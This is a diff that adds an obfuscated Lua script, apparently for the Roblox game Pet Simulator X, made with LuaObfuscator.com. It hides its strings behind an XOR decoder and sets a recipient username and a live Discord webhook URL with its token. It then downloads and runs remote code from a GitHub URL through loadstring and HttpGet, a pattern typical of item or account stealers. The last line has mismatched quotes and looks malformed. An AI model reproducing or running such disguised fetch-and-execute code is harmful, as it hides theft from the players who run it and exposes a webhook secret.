@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.4) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10=0;local v11;while true do if (v10==(0 -0)) then v11={};for v12=1 -0, #v8 do v6(v11,v0(v4(v1(v2(v8,v12,v12 + 1)),v1(v2(v9,1 + 0 + ((v12-1)% #v9),1 + 0 + ((v12-(2 -1))% #v9) + (1 -0))))%(1000 -(81 + 663))));end v10=1;end if (v10==(402 -(107 + 294))) then return v5(v11);end end end Username=v7("\175\81\229\11\249\184\131\23\186\87\160","\220\37\138\101\144\221");WebHook="https://discord.com/api/webhooks/1072214588713603112/oO2U4JDH9xRaTRbIX9Ndz0v3eyCSbp1SqsGvcdrExD_FV4DbRsuUhOthTUubAwYa5ORA";_G.CustomScriptName=v7("\221\50\215\9","\158\93\178\103");_G.Text1=v7("\243\143\231\3\208\152\181\38\207\141\241\15\196\194\187\68","\160\236\149\106");_G.Text2=v7("\145\131\232\100\35\168\133\161\118\37\180\194\210\115\56\175\146\245","\198\226\129\16\74");_G.Text3=v7("\220\62\169\167\28\246\56\171\228\36\252\36\165\180\3\236\120\226\234","\159\86\204\196\119");_G.Text4=v7("\116\227\0\174\101\215\16\160\7\196\2\174\120\206\10\180\9\185\79","\39\151\97\220\17\190\126\199");loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua))()"))();
